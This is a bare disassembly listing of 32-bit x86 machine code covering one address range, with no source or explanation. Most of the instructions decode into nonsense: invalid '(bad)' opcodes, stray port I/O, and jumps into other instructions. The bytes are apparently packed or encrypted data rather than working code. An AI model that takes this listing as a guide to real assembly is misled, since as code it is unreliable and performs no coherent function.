  40b8b3:	test   eax,0xa57c4675
  40b8b8:	pop    ebp
  40b8b9:	xchg   esi,eax
  40b8ba:	imul   ebx,esi,0xfffffff9
  40b8bd:	data16 in al,dx
  40b8bf:	(bad)  
  40b8c1:	push   cs
  40b8c2:	sti    
  40b8c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8c4:	iret   
  40b8c5:	test   eax,0xd00cd118
  40b8ca:	ficom  WORD PTR [eax]
  40b8cc:	data16 xchg BYTE PTR [eax+0x7b],ch
  40b8d0:	sti    
  40b8d1:	(bad)  
  40b8d2:	push   DWORD PTR [edi-0x49]
  40b8d5:	adc    esi,ebp
  40b8d7:	out    0xe7,al
  40b8d9:	push   0x2e01f1c8
  40b8de:	out    0x14,al
  40b8e0:	lods   al,BYTE PTR ds:[esi]
  40b8e1:	or     DWORD PTR [esi],ecx
  40b8e3:	mov    ebp,?
  40b8e5:	aaa    
  40b8e6:	mov    cl,0x8f
  40b8e8:	cmp    BYTE PTR [edi+0x1],bh
  40b8eb:	push   ecx
  40b8ec:	lods   al,BYTE PTR ds:[esi]
  40b8ed:	scas   eax,DWORD PTR es:[edi]
  40b8ee:	adc    al,0xee
  40b8f0:	loope  0x40b8e8
  40b8f2:	inc    eax
  40b8f3:	push   edi
  40b8f4:	mov    ds:0x5fbc3f2f,eax
  40b8f9:	mov    bh,BYTE PTR [edi]
  40b8fb:	xchg   esp,eax
  40b8fc:	pop    edx
  40b8fd:	daa    
  40b8fe:	xchg   esi,eax
  40b8ff:	outs   dx,DWORD PTR ds:[esi]
  40b900:	rcr    BYTE PTR [edx+eiz*4-0x55208a18],1
  40b907:	stos   BYTE PTR es:[edi],al
  40b908:	push   ebp
  40b909:	jmp    0x40b8fb
  40b90b:	pusha  
  40b90c:	lods   eax,DWORD PTR ds:[esi]
  40b90d:	out    dx,eax
  40b90e:	imul   esp,ebp,0xab782ce0
  40b914:	xor    BYTE PTR [ebp+0x71],cl
  40b917:	push   ss
  40b918:	cmp    edi,edi
  40b91a:	cmp    al,0x5f
  40b91c:	out    dx,al
  40b91d:	int    0xbb
  40b91f:	test   al,0x61
  40b921:	out    dx,eax
  40b922:	aaa    
  40b923:	adc    ch,cl
  40b925:	dec    BYTE PTR [esi]
  40b927:	clc    
  40b928:	add    bh,BYTE PTR [edi+0xb]
  40b92b:	cmp    al,0x37
  40b92d:	std    
  40b92e:	add    al,0xa7
  40b930:	jb     0x40b8be
  40b932:	push   ss
  40b933:	sar    DWORD PTR [ebx+ecx*4+0x67],1
  40b937:	iret   
  40b938:	pop    edi
  40b939:	(bad)  
  40b93a:	xchg   DWORD PTR cs:[ecx],esi
  40b93d:	mov    edx,0x336b5c77
  40b942:	in     eax,dx
  40b943:	ins    DWORD PTR es:[edi],dx
  40b944:	mov    ds:0xa67e5465,al
  40b949:	clc    
  40b94a:	rol    BYTE PTR [edx],1
  40b94c:	pop    ds
  40b94d:	xor    bh,BYTE PTR [ebx-0x68]
  40b950:	ss jmp 0x40b9a1
  40b953:	jbe    0x40b8f2
  40b955:	xor    DWORD PTR [eax+0x626d6dd0],eax
  40b95b:	stos   BYTE PTR es:[edi],al
  40b95c:	inc    esi
  40b95d:	pop    esi
  40b95e:	xchg   ecx,ecx
  40b960:	(bad)  
  40b961:	out    0x5e,eax
  40b963:	or     BYTE PTR [edi+0x255dc73a],dl
  40b969:	push   ebx
  40b96a:	push   eax
  40b96b:	mov    bl,0xf
  40b96d:	jmp    FWORD PTR [ebp+0x2f]
  40b970:	dec    ecx
  40b971:	shl    BYTE PTR [edx-0x54],1
  40b974:	(bad)  
  40b975:	int3   
  40b976:	loope  0x40b99a
  40b978:	dec    edx
  40b979:	push   esp
  40b97a:	sub    BYTE PTR [esi-0x78],dl
  40b97d:	popa   
  40b97e:	mov    bh,BYTE PTR cs:[eax-0x57550a59]
  40b985:	xchg   bl,ah
  40b987:	jecxz  0x40b95c
  40b989:	xchg   ebx,eax
  40b98a:	and    DWORD PTR [edi-0x485eda66],eax
  40b990:	mov    dh,0xff
  40b992:	pop    ebp
  40b993:	outs   dx,DWORD PTR ds:[esi]
  40b994:	sub    BYTE PTR [esp+edx*8],bl
  40b997:	fwait
  40b998:	jo     0x40b93e
  40b99a:	and    eax,0x71c48888
  40b99f:	mov    edx,0xceabd631
  40b9a4:	pop    esi
  40b9a5:	mov    WORD PTR [ebp+0x64],gs
  40b9a8:	pop    ebp
  40b9a9:	std    
  40b9aa:	cli    
  40b9ab:	mov    edi,0x3faf8d9e
  40b9b0:	sub    eax,0x1d760db0
  40b9b5:	xchg   ebp,eax
  40b9b6:	test   ch,bl
  40b9b8:	xchg   DWORD PTR [edx],ebx
  40b9ba:	jp     0x40b9bb
  40b9bc:	inc    eax
  40b9bd:	data16 mov bh,0xff
  40b9c0:	sub    DWORD PTR [ecx+0x8e6823d],eax
  40b9c6:	mov    ecx,0x7c982ce
  40b9cb:	mov    eax,ds:0x9740e3a7
  40b9d0:	jmp    0x40b98d
  40b9d2:	mov    dh,0xbc
  40b9d4:	cmp    al,BYTE PTR [edx-0x21]
  40b9d7:	dec    ecx
  40b9d8:	mov    cl,0x20
  40b9da:	mov    eax,0xc4f002f7
  40b9df:	cmp    al,0x85
  40b9e1:	pop    ebx
  40b9e2:	mul    BYTE PTR [edi+0x733ee56a]
  40b9e8:	or     ah,dh
  40b9ea:	cmp    al,BYTE PTR [ebp-0x4a]
  40b9ed:	push   ecx
  40b9ee:	(bad)  
  40b9ef:	lock (bad) 
  40b9f1:	lods   eax,DWORD PTR ds:[esi]
  40b9f2:	je     0x40ba0d
  40b9f4:	dec    ebx
  40b9f5:	aas    
  40b9f6:	adc    eax,0x63f4eca
  40b9fb:	push   ss
  40b9fc:	push   es
  40b9fd:	cmp    BYTE PTR [esi+ebx*4],bh
  40ba00:	mov    ds:0xc8b867e4,al
  40ba05:	into   
  40ba06:	pop    edi
  40ba07:	out    dx,al
  40ba08:	(bad)  
  40ba09:	(bad)  
  40ba0a:	leave  
  40ba0b:	frstor [eax+ebx*1]
  40ba0e:	pop    ss
  40ba0f:	jecxz  0x40ba35
  40ba11:	xor    DWORD PTR [ecx+0x7b],esp
  40ba14:	inc    eax
  40ba15:	dec    edx
  40ba16:	push   ds
  40ba17:	jnp    0x40ba54
  40ba19:	xor    DWORD PTR [ebx-0x8a16538],edi
  40ba1f:	adc    al,0xf4
  40ba21:	and    ebp,esp
  40ba23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba24:	nop
  40ba25:	fwait
  40ba26:	xchg   edi,eax
  40ba27:	sub    al,0x1d
  40ba29:	inc    edx
  40ba2a:	outs   dx,BYTE PTR ds:[esi]
  40ba2b:	push   ebx
  40ba2c:	pop    ebx
  40ba2d:	lds    esi,FWORD PTR es:[edi-0x7b]
  40ba31:	jg     0x40b9c4
  40ba33:	gs repz mov edx,0x7377626a
  40ba3a:	jo     0x40ba76
  40ba3c:	and    al,0x39
  40ba3e:	das    
  40ba3f:	xlat   BYTE PTR ds:[ebx]
  40ba40:	push   ss
  40ba41:	loope  0x40ba86
  40ba43:	ja     0x40ba1e
  40ba45:	dec    edi
  40ba46:	jle    0x40ba26
  40ba48:	and    eax,0xb95759ed
  40ba4d:	add    BYTE PTR [ebp+0x8bbaf0c],dl
  40ba53:	neg    cl
  40ba55:	daa    
  40ba56:	adc    eax,0x42ed7c49
  40ba5b:	(bad)
  40ba5e:	push   ss
  40ba5f:	jmp    0xf7a5:0xd690a86e
  40ba66:	dec    ecx
  40ba67:	out    0x6d,eax
  40ba69:	out    dx,eax
  40ba6a:	je     0x40ba2f
  40ba6c:	loopne 0x40baa8
  40ba6e:	stc    
  40ba6f:	mov    esi,0x926482d
  40ba74:	add    esp,eax
  40ba76:	nop
  40ba77:	cwde   
  40ba78:	jns    0x40bab1
  40ba7a:	sub    eax,0xc38b25d6
  40ba7f:	push   esp
  40ba80:	iret   
  40ba81:	xchg   al,bh
  40ba83:	adc    al,ch
  40ba85:	jle    0x40ba4a
  40ba87:	jg     0x40ba95
  40ba89:	push   ecx
  40ba8a:	loopne 0x40ba7c
  40ba8c:	mov    ds:0xb04c302f,al
  40ba91:	mov    bl,0x52
  40ba93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba95:	pop    esp
  40ba96:	mov    ds:0xf56227af,al
  40ba9b:	push   esp
  40ba9c:	xor    BYTE PTR [ebx+0x7c0af753],0x3e
  40baa3:	fneni(8087 only) 
  40baa5:	jle    0x40ba44
  40baa7:	push   cs
  40baa8:	inc    ebx
  40baa9:	mov    ah,0x8
  40baab:	mov    dh,0xed
  40baad:	mov    DWORD PTR [esp+ecx*4-0x38],esi
  40bab1:	lea    edx,[ebp+0x7a7d1702]
  40bab7:	sub    esi,DWORD PTR [edx]
  40bab9:	push   edx
  40baba:	sahf   
  40babb:	or     eax,0x4b015f2c
  40bac0:	mov    edx,0x80229f81
  40bac5:	lea    ecx,[esi-0x71c9b60e]
  40bacb:	je     0x40ba76
  40bacd:	repnz mov ah,0xc0
  40bad0:	push   cs
  40bad1:	inc    eax
  40bad2:	and    al,0x65
  40bad4:	fcom   QWORD PTR [eax+0x4e]
  40bad7:	fsub   QWORD PTR [esi-0x4f097284]
  40badd:	add    eax,0x50efd97e
  40bae2:	add    DWORD PTR [ebx-0x109319b1],0xab735f0a
  40baec:	push   0x47
  40baee:	sti    
  40baef:	aam    0xb4
  40baf1:	loope  0x40babd
  40baf3:	cli    
  40baf4:	clc    
  40baf5:	retf   0xcd4
  40baf8:	int3   
  40baf9:	test   al,0xed
  40bafb:	ret    0xa76f
  40bafe:	add    dl,BYTE PTR [ebx-0x41]
  40bb01:	add    bl,BYTE PTR [edi+0x3f]
  40bb04:	or     esi,esi
  40bb06:	repz test DWORD PTR [edi-0x209f31da],ebp
  40bb0d:	cmp    BYTE PTR [ecx+0x16c912a],ah
  40bb13:	int3   
  40bb14:	cmp    DWORD PTR [edi-0x779d0282],edx
  40bb1a:	std    
  40bb1b:	rcl    DWORD PTR [eax+0x616c0615],1
  40bb21:	int3   
  40bb22:	mov    ds:0x28e12f97,eax
  40bb27:	xor    DWORD PTR [eax+0x23],0xbf54f589
  40bb2e:	ins    BYTE PTR es:[edi],dx
  40bb2f:	xor    dl,BYTE PTR [ecx+0x6950bfe5]
  40bb35:	shr    DWORD PTR [esi-0x42f4f60e],1
  40bb3b:	add    eax,0xa5c6b54d
  40bb40:	or     DWORD PTR [edx+0x3f11ae55],0x1c
  40bb47:	mov    WORD PTR [esi],?
  40bb49:	jecxz  0x40bb9d
  40bb4b:	mov    bh,0x3b
  40bb4d:	je     0x40bba8
  40bb4f:	fdivr  DWORD PTR es:[ecx-0x3a39dea3]
  40bb56:	push   ds
  40bb57:	mov    eax,ds:0x97a2ba2f
  40bb5c:	gs jno 0x40baf4
  40bb5f:	sub    al,0xc3
  40bb61:	cmp    eax,0xd104d66b
  40bb66:	pop    eax
  40bb67:	pop    eax
  40bb68:	in     eax,0xcb
  40bb6a:	scas   eax,DWORD PTR es:[edi]
  40bb6b:	ret    
  40bb6c:	xor    BYTE PTR [esi-0x1df79b87],bh
  40bb72:	inc    ecx
  40bb73:	out    dx,al
  40bb74:	inc    ebx
  40bb75:	xchg   edx,eax
  40bb76:	hlt    
  40bb77:	cs dec eax
  40bb79:	retf   0xdcb
  40bb7c:	scas   al,BYTE PTR es:[edi]
  40bb7d:	repnz inc ecx
  40bb7f:	mov    ebp,0xbc6c140f
  40bb84:	jo     0x40bb5c
  40bb86:	stos   DWORD PTR es:[edi],eax
  40bb87:	std    
  40bb88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb89:	leave  
  40bb8a:	sbb    edx,esi
  40bb8c:	mov    ah,0x82
  40bb8e:	fild   DWORD PTR [edx+0x6420b4e5]
  40bb94:	mov    ah,0x10
  40bb96:	xor    al,0xc7
  40bb98:	inc    ebp
  40bb99:	into   
  40bb9a:	cwde   
  40bb9b:	popf   
  40bb9c:	adc    ebx,DWORD PTR cs:[edi+0x49]
  40bba0:	aaa    
  40bba1:	cmc    
  40bba2:	js     0x40bb2c
  40bba4:	push   ebp
  40bba5:	cmp    al,0xd8
  40bba7:	jne    0x40bb4e
  40bba9:	sbb    eax,0x3fbd1ee8
  40bbae:	fcom   DWORD PTR [edx-0x6]
  40bbb1:	cmp    ch,BYTE PTR [eax-0x4f]
  40bbb4:	jns    0x40bbd5
  40bbb6:	pop    ecx
  40bbb7:	mov    bl,BYTE PTR [ebx+0xf91c23a]
  40bbbd:	pop    eax
  40bbbe:	in     al,0xda
  40bbc0:	sar    eax,1
  40bbc2:	dec    ebx
  40bbc3:	push   0xffffffd3
  40bbc5:	dec    esi
  40bbc6:	cs dec esi
  40bbc8:	lea    edi,[edi+0x5]
  40bbcb:	xchg   edi,eax
  40bbcc:	or     BYTE PTR [esi-0x65],al
  40bbcf:	int3   
  40bbd0:	mov    es,WORD PTR [ebx+0x3d]
  40bbd3:	test   esi,ebx
  40bbd5:	rcl    edi,1
  40bbd7:	hlt    
  40bbd8:	data16 jns 0x40bbcd
  40bbdb:	fisubr WORD PTR [edi+edi*4-0x64]
  40bbdf:	inc    eax
  40bbe0:	mov    al,0x85
  40bbe2:	(bad)  
  40bbe3:	pusha  
  40bbe4:	sub    DWORD PTR [ebx],0xe29901a2
  40bbea:	outs   dx,BYTE PTR ds:[esi]
  40bbeb:	mov    ah,0xee
  40bbed:	push   ds
  40bbee:	ds addr16 pusha 
  40bbf1:	lock das 
  40bbf3:	imul   ecx,edi,0x57
  40bbf6:	sbb    DWORD PTR [esi+edi*8+0x38],edx
  40bbfa:	or     cl,cl
  40bbfc:	cwde   
  40bbfd:	clc    
  40bbfe:	mov    dl,0xa2
  40bc00:	adc    BYTE PTR [edx+ebp*2],bh
  40bc03:	sbb    al,0xe9
  40bc05:	xchg   esp,eax
  40bc06:	repz icebp 
  40bc08:	ss jmp 0x40bbbb
  40bc0b:	mov    eax,ecx
  40bc0d:	jnp    0x40bbb6
  40bc0f:	mov    eax,0x20752621
  40bc14:	mov    cl,BYTE PTR [ecx+ebx*1]
  40bc17:	cmp    cl,ah
  40bc19:	in     al,0x61
  40bc1b:	mov    esi,0x859d942b
  40bc20:	ins    BYTE PTR es:[edi],dx
  40bc21:	mov    ch,0x85
  40bc23:	push   es
  40bc24:	out    dx,eax
  40bc25:	xchg   esp,eax
  40bc26:	xchg   cl,bh
  40bc28:	xor    ecx,DWORD PTR [edi]
  40bc2a:	sbb    eax,0xf81135e0
  40bc2f:	cmp    DWORD PTR [eax-0x21],0xb2235870
  40bc36:	addr16 inc edi
  40bc38:	inc    ebp
  40bc39:	sbb    esi,DWORD PTR [edi-0x1]
  40bc3c:	dec    esi
  40bc3d:	mov    eax,0x217b5522
  40bc42:	fwait
  40bc43:	jl     0x40bbca
  40bc45:	dec    eax
  40bc46:	out    0x1d,al
  40bc48:	pop    es
  40bc49:	cmp    BYTE PTR [esi+0x2],ah
  40bc4c:	cmp    al,0x9f
  40bc4e:	add    esi,DWORD PTR [esi-0x72]
  40bc51:	pop    ebx
  40bc52:	mov    al,ds:0x15a72c8e
  40bc57:	adc    al,0x7e
  40bc59:	xor    eax,0x1a1534d6
  40bc5e:	iret   
  40bc5f:	data16 cmp al,BYTE PTR [edx]
  40bc62:	div    DWORD PTR [edi+0x60]
  40bc65:	pop    edi
  40bc66:	call   0xa624876f
  40bc6b:	fdiv   QWORD PTR ds:0xc23ccc4d
  40bc71:	push   es
  40bc72:	mov    al,ds:0xbce0b4b9
  40bc77:	lock push edi
  40bc79:	pop    ds
  40bc7a:	push   es
  40bc7b:	adc    al,0x55
  40bc7d:	add    eax,0x2488f61c
  40bc82:	shl    esp,1
  40bc84:	int3   
  40bc85:	jnp    0x40bcf6
  40bc87:	sbb    ebp,DWORD PTR [edx-0x5fdbff2d]
  40bc8d:	lock or DWORD PTR [edx+ebp*2+0x4c],ecx
  40bc92:	push   ebx
  40bc93:	sub    al,0x4d
  40bc95:	pushf  
  40bc96:	rol    BYTE PTR [esi],cl
  40bc98:	cmp    BYTE PTR [ebp-0x27],bh
  40bc9b:	std    
  40bc9c:	or     dh,BYTE PTR [ebp-0x6ab86c7b]
  40bca2:	adc    ah,BYTE PTR [eax-0x2a042cc1]
  40bca8:	fiadd  DWORD PTR [ebx]
  40bcaa:	mov    bh,0xad
  40bcac:	sar    BYTE PTR [ebp+0x4c],0xae
  40bcb0:	mov    dl,0x44
  40bcb2:	retf   
  40bcb3:	pusha  
  40bcb4:	adc    al,0xa7
  40bcb6:	jns    0x40bcd3
  40bcb8:	cmp    al,0x88
  40bcba:	pop    ebx
  40bcbb:	out    0x3b,al
  40bcbd:	and    ah,ch
  40bcbf:	mov    ds:0xffd31099,eax
  40bcc4:	fst    st(1)
  40bcc6:	and    al,0xea
  40bcc8:	xor    DWORD PTR [ecx-0x9],edx
  40bccb:	lahf   
  40bccc:	mov    WORD PTR [ecx+0x41982882],?
  40bcd2:	nop
  40bcd3:	jnp    0x40bce6
  40bcd5:	add    DWORD PTR [ecx-0x7],esp
  40bcd8:	scas   al,BYTE PTR es:[edi]
  40bcd9:	mov    ebx,0x239d6bb1
  40bcde:	in     eax,dx
  40bcdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce0:	xor    eax,0x96f692da
  40bce5:	push   ecx
  40bce6:	cwde   
  40bce7:	rcl    DWORD PTR [eax+0x35],1
  40bcea:	ss adc edx,ebp
  40bced:	pop    es
  40bcee:	neg    BYTE PTR [edi-0x1d]
  40bcf1:	or     al,0xc3
  40bcf3:	sub    esp,eax
  40bcf5:	sahf   
  40bcf6:	mov    ss,WORD PTR [eax+0x5619d364]
  40bcfc:	pcmpeqb mm7,QWORD PTR [ebx-0x67]
  40bd00:	inc    ebp
  40bd01:	hlt    
  40bd02:	repz es call 0xea4c1525
  40bd09:	(bad)  
  40bd0a:	es and esi,esi
  40bd0d:	xchg   ecx,eax
  40bd0e:	add    eax,0x3b6ca1b6
  40bd13:	dec    ebx
  40bd14:	dec    ecx
  40bd15:	inc    edi
  40bd16:	mov    bl,0x36
  40bd18:	adc    BYTE PTR [edi+0x6cd6719c],dl
  40bd1e:	mov    bl,BYTE PTR [edi]
  40bd20:	mov    BYTE PTR [edx+0x2b],dl
  40bd23:	xor    al,0x53
  40bd25:	dec    ecx
  40bd26:	adc    ecx,DWORD PTR es:[eax+ebx*8]
  40bd2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd2b:	mov    ah,0x78
  40bd2d:	push   ebp
  40bd2e:	adc    dh,bh
  40bd30:	adc    al,0x5e
  40bd32:	fadd   QWORD PTR [eax+ebx*8]
  40bd35:	mov    al,BYTE PTR [ecx]
  40bd37:	les    esi,FWORD PTR [ebp+0x35757b51]
  40bd3d:	or     eax,0xb569dbf5
  40bd42:	xchg   esi,eax
  40bd43:	xor    edi,ebx
  40bd45:	(bad)  
  40bd46:	retf   
  40bd47:	iret   
  40bd48:	push   es
  40bd49:	les    esi,FWORD PTR [edx+0x15]
  40bd4c:	fmul   QWORD PTR [edi]
  40bd4e:	lock fiadd DWORD PTR fs:[ecx]
  40bd52:	fadd   DWORD PTR [edi+0x31e8620f]
  40bd58:	bound  eax,QWORD PTR [eax-0x724eb043]
  40bd5e:	xor    BYTE PTR [ecx+0x519f7726],dh
  40bd64:	and    BYTE PTR [edx+0x5c],ah
  40bd67:	ret    0x31c0
  40bd6a:	jb     0x40bdbe
  40bd6c:	inc    ebx
  40bd6d:	or     bh,bl
  40bd6f:	xchg   ebx,eax
  40bd70:	cmp    eax,edx
  40bd72:	popf   
  40bd73:	inc    edi
  40bd74:	xor    esp,DWORD PTR [edx]
  40bd76:	ins    DWORD PTR es:[edi],dx
  40bd77:	jb     0x40bdc0
  40bd79:	push   0x4facc60e
  40bd7e:	xchg   DWORD PTR [esi+0x26f58508],eax
  40bd84:	or     ch,ah
  40bd86:	je     0x40bdf6
  40bd88:	and    eax,0x93cd80d4
  40bd8d:	pop    es
  40bd8e:	or     DWORD PTR [edi-0x6e],ebx
  40bd91:	push   DWORD PTR [edi-0xe]
  40bd94:	(bad)  
  40bd95:	mov    ebx,0xf377d213
  40bd9a:	loopne 0x40bdf2
  40bd9c:	shr    BYTE PTR [edi-0x27e503d5],cl
  40bda2:	pop    esp
  40bda3:	push   ds
  40bda4:	sar    DWORD PTR [ecx],0x67
  40bda7:	sbb    ebp,DWORD PTR [ebx+0x14]
  40bdaa:	mov    BYTE PTR [ecx],0x3c
  40bdad:	jnp    0x40bd5b
  40bdaf:	sbb    al,0x34
  40bdb1:	adc    eax,0x86bc30f3
  40bdb6:	out    0x96,al
  40bdb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdb9:	repnz cmp eax,0xdc729096
  40bdbf:	rcl    BYTE PTR [ebx],1
  40bdc1:	adc    esi,esp
  40bdc3:	int3   
  40bdc4:	je     0x40be1d
  40bdc6:	aad    0xfa
  40bdc8:	nop
  40bdc9:	retf   
  40bdca:	xchg   ebp,eax
  40bdcb:	loop   0x40bde3
  40bdcd:	stos   BYTE PTR es:[edi],al
  40bdce:	stc    
  40bdcf:	je     0x40bddc
  40bdd1:	pop    edx
  40bdd2:	sub    BYTE PTR [ecx-0x28e8edc5],dl
  40bdd8:	arpl   WORD PTR [eax+0x3e],dx
  40bddb:	dec    edx
  40bddc:	inc    esp
  40bddd:	push   edx
  40bdde:	into   
  40bddf:	fs xchg edx,eax
  40bde1:	mov    cl,0x6e
  40bde3:	cli    
  40bde4:	cmp    DWORD PTR [esi],esi
  40bde6:	imul   ebx,eax,0xffffff86
  40bde9:	jno    0x40bd9a
  40bdeb:	mov    al,0x5f
  40bded:	cmp    DWORD PTR [esi-0x21],0x39edfc76
  40bdf4:	xchg   cl,ah
  40bdf6:	(bad)  
  40bdf7:	lock in al,dx
  40bdf9:	fcom   DWORD PTR [ecx+0x30]
  40bdfc:	repz xor BYTE PTR [esi+0x644566d3],dl
  40be03:	adc    ch,dh
  40be05:	out    dx,al
  40be06:	(bad)  
  40be07:	cdq    
  40be08:	or     bh,BYTE PTR [eax+0xc]
  40be0b:	inc    edi
  40be0c:	inc    ecx
  40be0d:	leave  
  40be0e:	jae    0x40be6e
  40be10:	into   
  40be11:	out    dx,al
  40be12:	push   esi
  40be13:	daa    
  40be14:	fild   WORD PTR [ebx-0x79aa84cf]
  40be1a:	(bad)  
  40be1b:	iret   
  40be1c:	enter  0xbc6,0xbb
  40be20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be21:	imul   ecx,DWORD PTR [esi-0x15],0x8e660e65
  40be28:	and    DWORD PTR [ecx-0x7d7c34ec],esi
  40be2e:	ss add eax,esp
  40be31:	scas   al,BYTE PTR es:[edi]
  40be32:	mov    al,ds:0xdc7a5a15
  40be37:	stos   DWORD PTR es:[edi],eax
  40be38:	mov    BYTE PTR [ecx],bh
  40be3a:	shrd   DWORD PTR [edx+0x4bc516d5],ebp,0xfb
  40be42:	call   0xf2b3:0x1bc78aec
  40be49:	mov    esp,DWORD PTR [edi]
  40be4b:	or     DWORD PTR [eax],ecx
  40be4d:	in     eax,dx
  40be4e:	adc    al,0xa9
  40be50:	arpl   WORD PTR [edx],sp
  40be52:	out    0x84,al
  40be54:	(bad)  
  40be55:	enter  0x9115,0xd5
  40be59:	xor    bl,BYTE PTR [edx]
  40be5b:	jne    0x40beca
  40be5d:	or     dh,dl
  40be5f:	mov    ecx,0xbea894e4
  40be64:	jmp    0x40bed2
  40be66:	test   cl,ch
  40be68:	mov    al,0x78
  40be6a:	out    0x80,al
  40be6c:	pop    eax
  40be6d:	call   0xecb0916b
  40be72:	fist   WORD PTR [ebx+ebp*2-0x3fcf15d9]
  40be79:	sbb    al,0x7
  40be7b:	cmp    esp,DWORD PTR [ecx-0x5a3e000b]
  40be81:	adc    BYTE PTR [edx-0x16fcb10e],ch
  40be87:	add    bh,BYTE PTR [ecx-0x55501dd]
  40be8d:	push   cs
  40be8e:	cmp    esi,DWORD PTR [edi-0x72]
  40be91:	cs inc ebp
  40be93:	scas   eax,DWORD PTR es:[edi]
  40be94:	pop    es
  40be95:	and    dh,ah
  40be97:	(bad)  
  40be98:	jb     0x40be35
  40be9a:	xchg   ebp,eax
  40be9b:	retf   0xa287
  40be9e:	adc    BYTE PTR [ecx],ch
  40bea0:	imul   BYTE PTR [edx-0x47503e87]
  40bea6:	jns    0x40be82
  40bea8:	aas    
  40bea9:	ds mov edx,0x7dfc9f3b
  40beaf:	xchg   ecx,eax
  40beb0:	enter  0xbbe2,0x4f
  40beb4:	sub    DWORD PTR [eax+0x6b8eb7d],0x4a
  40bebb:	je     0x40be79
  40bebd:	pusha  
  40bebe:	adc    bl,BYTE PTR [ebx]
  40bec0:	pop    ebx
  40bec1:	lds    edx,FWORD PTR [edi]
  40bec3:	test   al,0xa0
  40bec5:	xlat   BYTE PTR ds:[ebx]
  40bec6:	lock ss mov bl,0x29
  40beca:	inc    esi
  40becb:	pop    edx
  40becc:	pop    ss
  40becd:	or     eax,0xbebd3f42
  40bed2:	pop    ds
  40bed3:	and    BYTE PTR [eax-0x72],bh
  40bed6:	xchg   edx,eax
  40bed7:	mov    dh,0xef
  40bed9:	(bad)  
  40beda:	ror    DWORD PTR ds:0x55b06a0b,0x11
  40bee1:	mov    al,ds:0xa1fae653
  40bee6:	sub    DWORD PTR [edx+ecx*4-0x6c],esp
  40beea:	mov    ds:0x8b115786,eax
  40beef:	push   ecx
  40bef0:	outs   dx,BYTE PTR ds:[esi]
  40bef1:	cmp    BYTE PTR [ebx+0x700029f4],dl
  40bef7:	mov    ebx,0x4d0ccd6b
  40befc:	or     ah,BYTE PTR [esi+edx*4-0x5b]
  40bf00:	in     eax,dx
  40bf01:	jb     0x40bf2b
  40bf03:	dec    edi
  40bf04:	add    al,0x7a
  40bf06:	push   ebp
  40bf07:	out    0x8,eax
  40bf09:	and    eax,0xb7e1c72b
  40bf0e:	sbb    BYTE PTR [ebx-0x447d2d24],0xdc
  40bf15:	pop    ebp
  40bf16:	pop    es
  40bf17:	push   edx
  40bf18:	imul   edi,DWORD PTR ds:[ebp-0x6a5e6306],0x5d
  40bf20:	div    DWORD PTR [ebp+0x73e32964]
  40bf26:	inc    edi
  40bf27:	pop    ebx
  40bf28:	cwde   
  40bf29:	pop    edx
  40bf2a:	daa    
  40bf2b:	stos   BYTE PTR es:[edi],al
  40bf2c:	(bad)  
  40bf2d:	cmc    
  40bf2e:	stos   BYTE PTR es:[edi],al
  40bf2f:	jl     0x40bf3f
  40bf31:	je     0x40bfab
  40bf33:	jnp    0x40bfaf
  40bf35:	imul   ebp,ecx,0xffffff9a
  40bf38:	dec    esi
  40bf39:	das    
  40bf3a:	ret    
  40bf3b:	lock push eax
  40bf3d:	repnz ss fcmovu st,st(3)
  40bf41:	jmp    0x40bee5
  40bf43:	loop   0x40bfb8
  40bf45:	dec    esi
  40bf46:	mov    ecx,0x41eeabb4
  40bf4b:	and    edx,ebx
  40bf4d:	ins    DWORD PTR es:[edi],dx
  40bf4e:	or     eax,0x398ecd66
  40bf53:	push   ss
  40bf54:	lea    edx,[ecx+0x7c3eb458]
  40bf5a:	fild   QWORD PTR [edi-0x5826d63c]
  40bf60:	xchg   ebx,eax
  40bf61:	adc    al,0x67
  40bf63:	outs   dx,DWORD PTR ds:[esi]
  40bf64:	mov    ah,0x4c
  40bf66:	sbb    eax,0xd61f6450
  40bf6b:	cwde   
  40bf6c:	loopne 0x40bf6d
  40bf6e:	arpl   WORD PTR [edx],cx
  40bf70:	addr16 mov ds:0x42fb,al
  40bf74:	adc    BYTE PTR [ebx+0x58e04f43],bl
  40bf7a:	dec    edi
  40bf7b:	enter  0xe013,0x2c
  40bf7f:	xchg   ebx,eax
  40bf80:	in     eax,0xe3
  40bf82:	in     eax,0x90
  40bf84:	adc    bh,BYTE PTR [eax]
  40bf86:	inc    esp
  40bf87:	inc    eax
  40bf88:	test   eax,esp
  40bf8a:	or     BYTE PTR [edx],dh
  40bf8c:	test   BYTE PTR [eax-0x4a7d7b5c],bl
  40bf92:	(bad)  
  40bf94:	push   0x656d8e19
  40bf99:	jbe    0x40bf46
  40bf9b:	mov    al,0x4b
  40bf9d:	add    al,0x4c
  40bf9f:	mov    eax,0x2a9c308a
  40bfa4:	cmp    al,0xef
  40bfa6:	adc    eax,0x1a8d8541
  40bfab:	jbe    0x40bf49
  40bfad:	add    eax,0x390c4183
  40bfb2:	push   ss
  40bfb3:	dec    edi
  40bfb4:	popa   
  40bfb5:	gs out 0x58,al
  40bfb8:	xor    eax,0x5ef05ec4
  40bfbd:	sbb    al,BYTE PTR [ebp-0xa]
  40bfc0:	and    DWORD PTR [eax+0x7afbe1ee],esp
  40bfc6:	fs adc esi,edi
  40bfc9:	fs or  eax,0xb14c41d5
  40bfcf:	pop    ds
  40bfd0:	aaa    
  40bfd1:	and    al,0xdb
  40bfd3:	or     esp,DWORD PTR [ecx+edx*4]
  40bfd6:	in     eax,dx
  40bfd7:	mov    esi,0x9ae55c00
  40bfdc:	cmp    esp,DWORD PTR [ecx+0x744b7804]
  40bfe2:	mov    DWORD PTR [edx+0x65],ecx
  40bfe5:	jl     0x40c038
  40bfe7:	or     cl,BYTE PTR [edx-0x6f4c760c]
  40bfed:	add    ecx,eax
  40bfef:	add    esi,DWORD PTR ds:0x2a756aed
  40bff5:	ja     0x40bfc9
  40bff7:	jbe    0x40c040
  40bff9:	lods   al,BYTE PTR ds:[esi]
  40bffa:	cdq    
  40bffb:	xchg   BYTE PTR [edx+ecx*8+0x2e],cl
